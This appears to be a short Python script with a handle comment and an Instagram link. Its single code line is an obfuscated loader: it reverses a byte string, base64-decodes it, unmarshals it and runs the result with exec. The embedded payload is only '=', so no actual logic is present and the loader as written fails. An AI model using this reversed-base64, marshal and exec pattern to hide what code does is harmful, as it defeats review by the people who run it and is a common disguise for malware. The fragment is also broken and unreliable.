# @SAW_1337
# https://instagram.com/127.0.2
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))